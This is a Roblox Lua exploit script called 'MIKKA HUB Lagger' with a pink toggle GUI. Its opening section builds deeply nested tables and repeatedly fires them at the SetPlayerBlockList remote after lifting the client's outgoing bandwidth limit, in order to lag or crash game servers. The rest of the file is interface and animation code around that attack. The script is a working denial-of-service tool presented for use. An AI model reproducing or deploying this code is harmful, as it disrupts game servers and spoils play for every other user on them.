local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== LAGGER LOGIC ====================
local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
        if not path or path == "" then return nil end
        local obj = game
        local cleaned = path:gsub("^game%.", "")
        for segment in cleaned:gmatch("[^%.]+") do
                if obj then
                        obj = obj[segment]
                else
                        return nil
                end
        end
        return obj
end

local function getmaxvalue(val)
        local mainvalueifonetable = 499999
        if type(val) ~= "number" then return nil end
        return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        table.insert(spammedtable, {})
        local z = spammedtable[1]
        for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
        end
        local maximum = getmaxvalue(tableincrease) or 9999999
        for i = 1, maximum do
                table.insert(maintable, spammedtable)
                if i % 5000 == 0 then task.wait() end
        end
        local remote = resolveRemote(CUSTOM_REMOTE_PATH)
        if remote then
                for i = 1, tries do
                        pcall(function()
                                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                                        remote:FireServer(maintable)
                                elseif remote:IsA("RemoteFunction") then
                                        remote:InvokeServer(maintable)
                                end
                        end)
                end
        end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
        while laggerEnabled do
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                task.spawn(function()
                        bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
                end)
                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
        end
end

local function stopLaggerLoop()
        laggerEnabled = false
        if laggerThread then
                coroutine.close(laggerThread)
                laggerThread = nil
        end
end

local function startLagger()
        if laggerThread then return end
        laggerEnabled = true
        laggerThread = coroutine.create(startLaggerLoop)
        coroutine.resume(laggerThread)
end

-- Workspace optimization
for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Texture") or v:IsA("Decal") then
                v:Destroy()
        elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
                v.Material = Enum.Material.SmoothPlastic
        end
end
-- ==================== END LAGGER LOGIC ====================

-- ==================== UI ====================
local toggleKey = Enum.KeyCode.V
local listeningForKey = false

-- Color Palette (Pinkish Theme)
local Colors = {
    Background = Color3.fromRGB(18, 14, 22),
    CardBg = Color3.fromRGB(28, 20, 32),
    CardBgHover = Color3.fromRGB(35, 26, 40),
    PrimaryPink = Color3.fromRGB(255, 105, 180),
    PrimaryPinkLight = Color3.fromRGB(255, 140, 200),
    PrimaryPinkDark = Color3.fromRGB(200, 60, 130),
    SecondaryPink = Color3.fromRGB(255, 182, 193),
    Accent = Color3.fromRGB(255, 20, 147),
    TextWhite = Color3.fromRGB(255, 240, 245),
    TextMuted = Color3.fromRGB(180, 150, 170),
    TextInactive = Color3.fromRGB(120, 90, 110),
    ToggleOff = Color3.fromRGB(50, 40, 55),
    ToggleOn = Color3.fromRGB(255, 105, 180),
    Glow = Color3.fromRGB(255, 20, 147),
    Shadow = Color3.fromRGB(10, 5, 12)
}

-- Root
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MikkaHubLagger"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = game.CoreGui

-- Main Frame (Larger, more premium)
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 280, 0, 340)
Main.Position = UDim2.new(0, 20, 0, 20)
Main.BackgroundColor3 = Colors.Background
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

-- Main Corner
local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 18)

-- Main Stroke (Border)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(60, 45, 70)
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.6

-- Main Shadow
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.Size = UDim2.new(1, 40, 1, 40)
Shadow.Position = UDim2.new(0, -20, 0, -20)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://131604521938076" -- Soft shadow
Shadow.ImageColor3 = Colors.Shadow
Shadow.ImageTransparency = 0.3
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(50, 50, 50, 50)
Shadow.ZIndex = -1
Shadow.Parent = Main

-- Glow Effect (Behind main)
local Glow = Instance.new("Frame")
Glow.Name = "Glow"
Glow.Size = UDim2.new(1, 20, 1, 20)
Glow.Position = UDim2.new(0, -10, 0, -10)
Glow.BackgroundColor3 = Colors.Glow
Glow.BackgroundTransparency = 0.95
Glow.BorderSizePixel = 0
Glow.ZIndex = -2
Glow.Parent = Main

local GlowCorner = Instance.new("UICorner", Glow)
GlowCorner.CornerRadius = UDim.new(0, 24)

-- Top Bar / Header
local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 70)
Header.Position = UDim2.new(0, 0, 0, 0)
Header.BackgroundColor3 = Colors.CardBg
Header.BorderSizePixel = 0
Header.Parent = Main

local HeaderCorner = Instance.new("UICorner", Header)
HeaderCorner.CornerRadius = UDim.new(0, 18)

-- Bottom fade for header
local HeaderBottom = Instance.new("Frame")
HeaderBottom.Size = UDim2.new(1, 0, 0, 20)
HeaderBottom.Position = UDim2.new(0, 0, 1, -10)
HeaderBottom.BackgroundColor3 = Colors.CardBg
HeaderBottom.BorderSizePixel = 0
HeaderBottom.Parent = Header

-- Logo Image
local Logo = Instance.new("ImageLabel")
Logo.Name = "Logo"
Logo.Size = UDim2.new(0, 48, 0, 48)
Logo.Position = UDim2.new(0, 16, 0, 11)
Logo.BackgroundTransparency = 1
Logo.Image = "https://files.catbox.moe/etlu5v.png"
Logo.ScaleType = Enum.ScaleType.Crop
Logo.Parent = Header

local LogoCorner = Instance.new("UICorner", Logo)
LogoCorner.CornerRadius = UDim.new(1, 0)

local LogoStroke = Instance.new("UIStroke", Logo)
LogoStroke.Color = Colors.PrimaryPink
LogoStroke.Thickness = 2
LogoStroke.Transparency = 0.3

-- Title: "MIKKA HUB"
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -80, 0, 28)
Title.Position = UDim2.new(0, 72, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "MIKKA HUB"
Title.TextColor3 = Colors.TextWhite
Title.TextSize = 20
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

-- Subtitle: "Lagger"
local Subtitle = Instance.new("TextLabel")
Subtitle.Name = "Subtitle"
Subtitle.Size = UDim2.new(1, -80, 0, 18)
Subtitle.Position = UDim2.new(0, 72, 0, 38)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Lagger"
Subtitle.TextColor3 = Colors.PrimaryPink
Subtitle.TextSize = 13
Subtitle.Font = Enum.Font.GothamMedium
Subtitle.TextXAlignment = Enum.TextXAlignment.Left
Subtitle.Parent = Header

-- Divider Line
local Divider = Instance.new("Frame")
Divider.Name = "Divider"
Divider.Size = UDim2.new(1, -32, 0, 1)
Divider.Position = UDim2.new(0, 16, 0, 70)
Divider.BackgroundColor3 = Color3.fromRGB(60, 45, 70)
Divider.BackgroundTransparency = 0.5
Divider.BorderSizePixel = 0
Divider.Parent = Main

-- Content Area
local Content = Instance.new("Frame")
Content.Name = "Content"
Content.Size = UDim2.new(1, 0, 1, -71)
Content.Position = UDim2.new(0, 0, 0, 71)
Content.BackgroundTransparency = 1
Content.Parent = Main

-- Status Card
local StatusCard = Instance.new("Frame")
StatusCard.Name = "StatusCard"
StatusCard.Size = UDim2.new(1, -28, 0, 80)
StatusCard.Position = UDim2.new(0, 14, 0, 14)
StatusCard.BackgroundColor3 = Colors.CardBg
StatusCard.BorderSizePixel = 0
StatusCard.Parent = Content

local StatusCardCorner = Instance.new("UICorner", StatusCard)
StatusCardCorner.CornerRadius = UDim.new(0, 14)

local StatusCardStroke = Instance.new("UIStroke", StatusCard)
StatusCardStroke.Color = Color3.fromRGB(50, 38, 58)
StatusCardStroke.Thickness = 1
StatusCardStroke.Transparency = 0.7

-- Status Label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Size = UDim2.new(1, -20, 0, 22)
StatusLabel.Position = UDim2.new(0, 10, 0, 12)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "INACTIVE"
StatusLabel.TextColor3 = Colors.TextInactive
StatusLabel.TextSize = 14
StatusLabel.Font = Enum.Font.GothamBold
StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
StatusLabel.Parent = StatusCard

-- Status Description
local StatusDesc = Instance.new("TextLabel")
StatusDesc.Name = "StatusDesc"
StatusDesc.Size = UDim2.new(1, -20, 0, 16)
StatusDesc.Position = UDim2.new(0, 10, 0, 38)
StatusDesc.BackgroundTransparency = 1
StatusDesc.Text = "Click toggle to start lagging"
StatusDesc.TextColor3 = Colors.TextMuted
StatusDesc.TextSize = 11
StatusDesc.Font = Enum.Font.Gotham
StatusDesc.TextXAlignment = Enum.TextXAlignment.Center
StatusDesc.Parent = StatusCard

-- Animated Status Dot
local StatusDot = Instance.new("Frame")
StatusDot.Name = "StatusDot"
StatusDot.Size = UDim2.new(0, 8, 0, 8)
StatusDot.Position = UDim2.new(0.5, -4, 0, 60)
StatusDot.BackgroundColor3 = Colors.TextInactive
StatusDot.BorderSizePixel = 0
StatusDot.Parent = StatusCard

local StatusDotCorner = Instance.new("UICorner", StatusDot)
StatusDotCorner.CornerRadius = UDim.new(1, 0)

-- Toggle Section
local ToggleSection = Instance.new("Frame")
ToggleSection.Name = "ToggleSection"
ToggleSection.Size = UDim2.new(1, -28, 0, 60)
ToggleSection.Position = UDim2.new(0, 14, 0, 106)
ToggleSection.BackgroundTransparency = 1
ToggleSection.Parent = Content

-- Toggle Label
local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.Size = UDim2.new(0.5, 0, 1, 0)
ToggleLabel.Position = UDim2.new(0, 0, 0, 0)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Text = "Enable Lagger"
ToggleLabel.TextColor3 = Colors.TextWhite
ToggleLabel.TextSize = 14
ToggleLabel.Font = Enum.Font.GothamMedium
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.Parent = ToggleSection

-- Toggle Switch Container
local ToggleSwitch = Instance.new("Frame")
ToggleSwitch.Name = "ToggleSwitch"
ToggleSwitch.Size = UDim2.new(0, 52, 0, 28)
ToggleSwitch.Position = UDim2.new(1, -52, 0.5, -14)
ToggleSwitch.BackgroundColor3 = Colors.ToggleOff
ToggleSwitch.BorderSizePixel = 0
ToggleSwitch.Parent = ToggleSection

local ToggleSwitchCorner = Instance.new("UICorner", ToggleSwitch)
ToggleSwitchCorner.CornerRadius = UDim.new(1, 0)

-- Toggle Knob
local ToggleKnob = Instance.new("Frame")
ToggleKnob.Name = "ToggleKnob"
ToggleKnob.Size = UDim2.new(0, 22, 0, 22)
ToggleKnob.Position = UDim2.new(0, 3, 0.5, -11)
ToggleKnob.BackgroundColor3 = Color3.fromRGB(100, 80, 110)
ToggleKnob.BorderSizePixel = 0
ToggleKnob.Parent = ToggleSwitch

local ToggleKnobCorner = Instance.new("UICorner", ToggleKnob)
ToggleKnobCorner.CornerRadius = UDim.new(1, 0)

-- Toggle Hit Area
local ToggleHit = Instance.new("TextButton")
ToggleHit.Name = "ToggleHit"
ToggleHit.Size = UDim2.new(1, 0, 1, 0)
ToggleHit.BackgroundTransparency = 1
ToggleHit.Text = ""
ToggleHit.Parent = ToggleSwitch

-- Keybind Section
local KeybindSection = Instance.new("Frame")
KeybindSection.Name = "KeybindSection"
KeybindSection.Size = UDim2.new(1, -28, 0, 60)
KeybindSection.Position = UDim2.new(0, 14, 0, 176)
KeybindSection.BackgroundColor3 = Colors.CardBg
KeybindSection.BorderSizePixel = 0
KeybindSection.Parent = Content

local KeybindCorner = Instance.new("UICorner", KeybindSection)
KeybindCorner.CornerRadius = UDim.new(0, 14)

local KeybindStroke = Instance.new("UIStroke", KeybindSection)
KeybindStroke.Color = Color3.fromRGB(50, 38, 58)
KeybindStroke.Thickness = 1
KeybindStroke.Transparency = 0.7

local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.Size = UDim2.new(0.5, 0, 1, 0)
KeybindLabel.Position = UDim2.new(0, 14, 0, 0)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.Text = "Toggle Keybind"
KeybindLabel.TextColor3 = Colors.TextWhite
KeybindLabel.TextSize = 14
KeybindLabel.Font = Enum.Font.GothamMedium
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.Parent = KeybindSection

local KeybindValue = Instance.new("TextLabel")
KeybindValue.Name = "KeybindValue"
KeybindValue.Size = UDim2.new(0, 50, 0, 28)
KeybindValue.Position = UDim2.new(1, -64, 0.5, -14)
KeybindValue.BackgroundColor3 = Colors.Background
KeybindValue.BorderSizePixel = 0
KeybindValue.Text = "V"
KeybindValue.TextColor3 = Colors.PrimaryPink
KeybindValue.TextSize = 13
KeybindValue.Font = Enum.Font.GothamBold
KeybindValue.TextXAlignment = Enum.TextXAlignment.Center
KeybindValue.Parent = KeybindSection

local KeybindValueCorner = Instance.new("UICorner", KeybindValue)
KeybindValueCorner.CornerRadius = UDim.new(0, 8)

local KeybindValueStroke = Instance.new("UIStroke", KeybindValue)
KeybindValueStroke.Color = Colors.PrimaryPink
KeybindValueStroke.Thickness = 1.5
KeybindValueStroke.Transparency = 0.5

-- Footer / Info
local Footer = Instance.new("Frame")
Footer.Name = "Footer"
Footer.Size = UDim2.new(1, -28, 0, 30)
Footer.Position = UDim2.new(0, 14, 1, -44)
Footer.BackgroundTransparency = 1
Footer.Parent = Content

local FooterText = Instance.new("TextLabel")
FooterText.Size = UDim2.new(1, 0, 1, 0)
FooterText.BackgroundTransparency = 1
FooterText.Text = "Press [V] to toggle lagger"
FooterText.TextColor3 = Colors.TextMuted
FooterText.TextSize = 11
FooterText.Font = Enum.Font.Gotham
FooterText.TextXAlignment = Enum.TextXAlignment.Center
FooterText.Parent = Footer

-- Particle Effects (Decorative)
local Particles = Instance.new("Frame")
Particles.Name = "Particles"
Particles.Size = UDim2.new(1, 0, 1, 0)
Particles.BackgroundTransparency = 1
Particles.Parent = Main

-- Create floating particles
for i = 1, 6 do
    local particle = Instance.new("Frame")
    particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
    particle.BackgroundColor3 = Colors.PrimaryPink
    particle.BackgroundTransparency = 0.8
    particle.BorderSizePixel = 0
    particle.Parent = Particles

    local pCorner = Instance.new("UICorner", particle)
    pCorner.CornerRadius = UDim.new(1, 0)

    -- Animate particle
    task.spawn(function()
        while true do
            local tw = TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            TweenService:Create(particle, tw, {
                Position = UDim2.new(math.random(), 0, math.random(), 0),
                BackgroundTransparency = math.random(0.7, 0.95)
            }):Play()
            task.wait(math.random(3, 6))
        end
    end)
end

-- ==================== ANIMATIONS & INTERACTIVITY ====================

-- Intro Animation
Main.Size = UDim2.new(0, 0, 0, 0)
Main.Position = UDim2.new(0, 20 + 140, 0, 20 + 170)
Main.BackgroundTransparency = 1

TweenService:Create(Main, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 280, 0, 340),
    Position = UDim2.new(0, 20, 0, 20),
    BackgroundTransparency = 0
}):Play()

-- Fade in elements
for _, child in pairs(Main:GetDescendants()) do
    if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") or child:IsA("Frame") then
        if child ~= Main and child ~= Glow and child ~= Shadow then
            child.BackgroundTransparency = child.BackgroundTransparency + 0.3
            if child:IsA("TextLabel") or child:IsA("TextButton") then
                child.TextTransparency = 1
            end
            if child:IsA("ImageLabel") then
                child.ImageTransparency = 1
            end

            task.delay(0.3 + (math.random() * 0.4), function()
                TweenService:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = child.BackgroundTransparency - 0.3
                }):Play()
                if child:IsA("TextLabel") or child:IsA("TextButton") then
                    TweenService:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                        TextTransparency = 0
                    }):Play()
                end
                if child:IsA("ImageLabel") then
                    TweenService:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                        ImageTransparency = 0
                    }):Play()
                end
            end)
        end
    end
end

-- Hover effects for cards
local function addHoverEffect(frame, stroke)
    frame.MouseEnter:Connect(function()
        TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Colors.CardBgHover
        }):Play()
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                Color = Colors.PrimaryPink,
                Transparency = 0.4
            }):Play()
        end
    end)
    frame.MouseLeave:Connect(function()
        TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Colors.CardBg
        }):Play()
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                Color = Color3.fromRGB(50, 38, 58),
                Transparency = 0.7
            }):Play()
        end
    end)
end

addHoverEffect(StatusCard, StatusCardStroke)
addHoverEffect(KeybindSection, KeybindStroke)

-- Pulse animation for status dot when active
local pulseConnection = nil
local function startPulse()
    if pulseConnection then pulseConnection:Disconnect() end
    local scale = 1
    local growing = true
    pulseConnection = RunService.Heartbeat:Connect(function()
        if growing then
            scale = scale + 0.02
            if scale >= 1.5 then growing = false end
        else
            scale = scale - 0.02
            if scale <= 1 then growing = true end
        end
        StatusDot.Size = UDim2.new(0, 8 * scale, 0, 8 * scale)
        StatusDot.Position = UDim2.new(0.5, -4 * scale, 0, 60 - 4 * (scale - 1))
    end)
end

local function stopPulse()
    if pulseConnection then
        pulseConnection:Disconnect()
        pulseConnection = nil
    end
    StatusDot.Size = UDim2.new(0, 8, 0, 8)
    StatusDot.Position = UDim2.new(0.5, -4, 0, 60)
end

-- Main Toggle Function
local function setLagger(state)
        laggerEnabled = state
        local twFast = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local twSlow = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

        if laggerEnabled then
            -- Toggle ON animations
            TweenService:Create(ToggleSwitch, twFast, {BackgroundColor3 = Colors.ToggleOn}):Play()
            TweenService:Create(ToggleKnob, twSlow, {
                Position = UDim2.new(0, 27, 0.5, -11),
                BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()

            -- Status updates
            StatusLabel.Text = "ACTIVE"
            StatusLabel.TextColor3 = Colors.PrimaryPink
            StatusDesc.Text = "Lagger is running..."
            StatusDesc.TextColor3 = Colors.SecondaryPink
            StatusDot.BackgroundColor3 = Colors.PrimaryPink

            -- Glow effect
            TweenService:Create(Glow, TweenInfo.new(0.5), {
                BackgroundTransparency = 0.85
            }):Play()

            -- Border color change
            TweenService:Create(MainStroke, TweenInfo.new(0.5), {
                Color = Colors.PrimaryPink,
                Transparency = 0.3
            }):Play()

            -- Card border
            TweenService:Create(StatusCardStroke, TweenInfo.new(0.5), {
                Color = Colors.PrimaryPink,
                Transparency = 0.4
            }):Play()

            startPulse()
            startLagger()
        else
            -- Toggle OFF animations
            TweenService:Create(ToggleSwitch, twFast, {BackgroundColor3 = Colors.ToggleOff}):Play()
            TweenService:Create(ToggleKnob, twSlow, {
                Position = UDim2.new(0, 3, 0.5, -11),
                BackgroundColor3 = Color3.fromRGB(100, 80, 110)
            }):Play()

            -- Status updates
            StatusLabel.Text = "INACTIVE"
            StatusLabel.TextColor3 = Colors.TextInactive
            StatusDesc.Text = "Click toggle to start lagging"
            StatusDesc.TextColor3 = Colors.TextMuted
            StatusDot.BackgroundColor3 = Colors.TextInactive

            -- Glow fade
            TweenService:Create(Glow, TweenInfo.new(0.5), {
                BackgroundTransparency = 0.95
            }):Play()

            -- Border reset
            TweenService:Create(MainStroke, TweenInfo.new(0.5), {
                Color = Color3.fromRGB(60, 45, 70),
                Transparency = 0.6
            }):Play()

            -- Card border reset
            TweenService:Create(StatusCardStroke, TweenInfo.new(0.5), {
                Color = Color3.fromRGB(50, 38, 58),
                Transparency = 0.7
            }):Play()

            stopPulse()
            stopLaggerLoop()
        end
end

-- Toggle Click Handler
ToggleHit.MouseButton1Click:Connect(function()
    setLagger(not laggerEnabled)
end)

-- Keybind Handler
UserInputService.InputBegan:Connect(function(input, gpe)
    if input.KeyCode == toggleKey and not gpe then
        setLagger(not laggerEnabled)
    end
end)

-- Logo hover effect
Logo.MouseEnter:Connect(function()
    TweenService:Create(Logo, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 52, 0, 52),
        Position = UDim2.new(0, 14, 0, 9)
    }):Play()
    TweenService:Create(LogoStroke, TweenInfo.new(0.3), {
        Transparency = 0
    }):Play()
end)

Logo.MouseLeave:Connect(function()
    TweenService:Create(Logo, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 48, 0, 48),
        Position = UDim2.new(0, 16, 0, 11)
    }):Play()
    TweenService:Create(LogoStroke, TweenInfo.new(0.3), {
        Transparency = 0.3
    }):Play()
end)

-- Subtle breathing animation for glow
local breathing = true
task.spawn(function()
    while breathing do
        if not laggerEnabled then
            TweenService:Create(Glow, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.92
            }):Play()
            task.wait(3)
            TweenService:Create(Glow, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.97
            }):Play()
            task.wait(3)
        else
            task.wait(1)
        end
    end
end)
